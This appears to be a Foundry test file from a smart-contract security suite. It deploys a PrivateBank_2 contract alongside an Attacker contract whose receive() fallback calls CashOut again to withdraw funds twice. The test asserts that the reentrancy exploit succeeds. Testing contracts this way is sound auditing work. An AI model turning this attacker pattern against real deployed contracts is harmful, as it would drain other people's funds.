
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {StdStorage, stdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyPrivateBank_2 is Test {
    using stdStorage for StdStorage;

    PrivateBank_2 public _contractUnderTest;
    Log public _logContract;
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new PrivateBank_2(address(_logContract));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 0.5 ether);
        vm.assume(attackVal <= type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateBank_2 public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;

    constructor(address victimAddress) {
        victim = PrivateBank_2(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackAmount = val;

        victim.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        attackAmount = val;
        
        victim.CashOut(attackAmount);

        if (victim.balances(address(this)) == 0 && 
            address(this).balance == initialSnapshot + (attackAmount * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            victim.CashOut(attackAmount);
            attackCallCount++;
        }
    }
}
